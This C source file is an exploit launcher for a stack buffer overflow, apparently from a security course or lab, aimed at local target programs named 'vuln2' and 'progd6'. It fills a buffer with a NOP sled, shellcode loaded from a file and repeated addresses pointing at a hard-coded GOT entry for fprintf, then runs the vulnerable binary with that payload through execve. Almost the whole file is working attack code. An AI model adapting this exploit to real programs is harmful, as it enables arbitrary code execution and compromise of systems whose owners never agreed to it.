//-----------------------------
//----------Calling c code-----
//-----------------------------

#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define NOP 0x90
//#define GOT_ADDRESS 0x080497b0 //this points the GOT fprintf table for selfcompiled vuln2
#define GOT_ADDRESS 0x0804978c //this points to GOT fprintf in progd6
#define MAX_FILE_SIZE 100

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}


int main(int argc, char **argv){
	//handle arguments
	if(argc<1){
		printf("Please provide at least a buffer size!\n");
		printf("Arguments: 1[opt:vulnerable file name] 2[file with exploit code] 3[buffer size] 4[offset] 5[nop size]\n");
		exit(0);
	}

	int buffer_size = 136;
	int offset = 0;
	int nop_size = 40;
	char *vulnerable_file = "vuln2";
	char *exploit_file = "expl2code.bin";
	
	if(argc>1)
		vulnerable_file = argv[1];
	if(argc>2)
		exploit_file = argv[2];
	if(argc>3)
		buffer_size = atoi(argv[3]);
	if(argc>4)
		offset = atoi(argv[4]);
	if(argc>5)
		nop_size = atoi(argv[5]);

	printf("Buffer size: 			%i\n", buffer_size);
	printf("Offset size: 			%i\n", offset);
	printf("Nop size: 			%i\n", nop_size);
	printf("Vulnerable File: 		%s\n", vulnerable_file);
	printf("Exploit File:			%s\n", exploit_file);

	char buff[buffer_size];
	char rplc_got[4];
	long *addr_ptr;
	long *rplc_got_ptr;	
	int addr;

	addr = get_sp();
	printf("Stack pointer is at: 		0x%x\n", addr);

	addr -= offset;
	printf("GOT Pointer address:		0x%x\n", GOT_ADDRESS);

	int i;
	int stupid = 0;

	//printf("Buffer is: %s\n", buff);
  	addr_ptr = (long *) buff;
	rplc_got_ptr = (long *) rplc_got;
	//write the assummed address of the shellcode nop-sledge into the buffer
  	for (i = 0; i < buffer_size/4; i++){
    	stupid += 1;
		//*(addr_ptr++) = addr;
		if(offset==0) addr_ptr[i] = GOT_ADDRESS;
		else addr_ptr[i] = addr;
	}
	//printf("Buffer is: %s\n", buff);
	printf("Jump addresses added:		%i\n", stupid);
	//fill the beginning of the buffer with a nop-sledge
  	for (i = 0; i < nop_size; i++){
    	buff[i] = NOP;
	}

	if(offset==0)
		addr_ptr[0] = GOT_ADDRESS+4;
	else
		addr_ptr[0] = addr+4;
	rplc_got_ptr[0] = GOT_ADDRESS+4;

	//read exploit from file into buffer
	FILE *f;
	int file;

	unsigned char file_buffer[MAX_FILE_SIZE];
	int fsize;
	
//	f = fopen(exploit_file, "rb");
    file = open(exploit_file, O_RDONLY);
	if (file){
         fsize = read(file, file_buffer, MAX_FILE_SIZE);
//		 fsize = fread(file_buffer, MAX_FILE_SIZE, 1, f);
	}else{
	    // error opening file
		printf("Error opening file\n");
		exit(0);
	}
//	fclose(f);
	printf("Exploit code size is 		%i\n", fsize);	
	//printf("Buffer is %s\n", buff);
	//write the shellcode into the buffer
  	for (i = nop_size; i < nop_size+fsize; i++){
		if(file_buffer[i-nop_size]==0){
			buff[i] = 0x90;
		}else{
    		buff[i] = file_buffer[i-nop_size];
		}
	}

	//termiante array before the return address to trick strlen
	//buff[nop_size+fsize] = '\0';	
	//terminate the array
  	buff[buffer_size - 1] = '\0';

	char *const parmList[] = {vulnerable_file, buff, buff, NULL};
	
	
	printf("Executing...	\n\n");
    execve(parmList[0], parmList, NULL);
  }

